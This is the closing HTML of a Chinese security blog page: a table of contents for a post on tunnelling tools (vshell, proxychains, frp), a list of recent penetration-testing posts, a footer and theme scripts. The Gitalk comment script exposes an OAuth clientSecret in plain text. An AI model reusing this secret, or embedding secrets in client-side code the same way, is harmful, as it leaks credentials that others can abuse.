href="#vshell%E5%B7%A5%E5%85%B7"><span class="toc-number">6.1.</span> <span class="toc-text">vshell工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">6.2.</span> <span class="toc-text">隧道代理的使用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#proxychains%E5%B7%A5%E5%85%B7"><span class="toc-number">6.2.1.</span> <span class="toc-text">proxychains工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#frp%E5%B7%A5%E5%85%B7"><span class="toc-number">6.3.</span> <span class="toc-text">frp工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">6.3.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">6.3.2.</span> <span class="toc-text">工作原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80-2"><span class="toc-number">6.3.3.</span> <span class="toc-text">下载地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95-2"><span class="toc-number">6.3.4.</span> <span class="toc-text">使用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E4%BC%A0%E7%BB%9F%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE"><span class="toc-number">6.3.4.1.</span> <span class="toc-text">方法一：传统代理配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9Asocks5%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE"><span class="toc-number">6.3.4.2.</span> <span class="toc-text">方法二：socks5隧道代理配置</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E7%BB%9F%E4%BB%A3%E7%90%86%E5%92%8C%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">6.4.</span> <span class="toc-text">传统代理和隧道代理的区别</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/04/01/%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%B8%80/" title="入门内网渗透实验一"><img src="/img/bg3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="入门内网渗透实验一"/></a><div class="content"><a class="title" href="/2024/04/01/%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%B8%80/" title="入门内网渗透实验一">入门内网渗透实验一</a><time datetime="2024-03-31T16:00:00.000Z" title="发表于 2024-04-01 00:00:00">2024-04-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/" title="Thymeleaf漏洞汇总"><img src="/img/bg10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Thymeleaf漏洞汇总"/></a><div class="content"><a class="title" href="/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/" title="Thymeleaf漏洞汇总">Thymeleaf漏洞汇总</a><time datetime="2024-03-23T16:00:00.000Z" title="发表于 2024-03-24 00:00:00">2024-03-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/24/Shiro-550%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/" title="Shiro-550不出网回显技术"><img src="/img/bg10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Shiro-550不出网回显技术"/></a><div class="content"><a class="title" href="/2024/03/24/Shiro-550%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/" title="Shiro-550不出网回显技术">Shiro-550不出网回显技术</a><time datetime="2024-03-23T16:00:00.000Z" title="发表于 2024-03-24 00:00:00">2024-03-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/13/Hessian%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" title="Hessian漏洞总结"><img src="/img/bg2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hessian漏洞总结"/></a><div class="content"><a class="title" href="/2024/03/13/Hessian%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" title="Hessian漏洞总结">Hessian漏洞总结</a><time datetime="2024-03-12T16:00:00.000Z" title="发表于 2024-03-13 00:00:00">2024-03-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/11/Fastjson%E4%BD%9C%E4%B8%BA%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84Gadget%E5%88%A9%E7%94%A8(%E5%85%A8%E7%89%88%E6%9C%AC%E9%80%9A%E6%9D%80)/" title="Fastjson作为原生反序列化的Gadget利用(全版本通杀)"><img src="/img/bg10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Fastjson作为原生反序列化的Gadget利用(全版本通杀)"/></a><div class="content"><a class="title" href="/2024/03/11/Fastjson%E4%BD%9C%E4%B8%BA%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84Gadget%E5%88%A9%E7%94%A8(%E5%85%A8%E7%89%88%E6%9C%AC%E9%80%9A%E6%9D%80)/" title="Fastjson作为原生反序列化的Gadget利用(全版本通杀)">Fastjson作为原生反序列化的Gadget利用(全版本通杀)</a><time datetime="2024-03-10T16:00:00.000Z" title="发表于 2024-03-11 00:00:00">2024-03-11</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/imgs/bg4.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By AnchorEureka</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Just do it!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadGitalk () {
+  function initGitalk () {
+    var gitalk = new Gitalk(Object.assign({
+      clientID: 'a7b0ec4b62c42ac613ca',
+      clientSecret: '56756824e86a782ebc5759e0e1fe96021d171f66',
+      repo: 'justdoit-cai.github.io',
+      owner: 'justdoit-cai',
+      admin: ['justdoit-cai'],
+      id: '4a2cfc2aa6aa76731c35feb1f6f9098c',
+      updateCountCallback: commentCount
+    },null))
+
+    gitalk.render('gitalk-container')
+  }
+
+  if (typeof Gitalk === 'function') initGitalk()
+  else {
+    getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
+    getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js').then(initGitalk)
+  }
+}
+
+function commentCount(n){
+  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
+  if (isCommentCount) {
+    isCommentCount.textContent= n
+  }
+}
+
+if ('Gitalk' === 'Gitalk' || !true) {
+  if (true) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
+  else loadGitalk()
+} else {
+  function loadOtherComment () {
+    loadGitalk()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="22px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
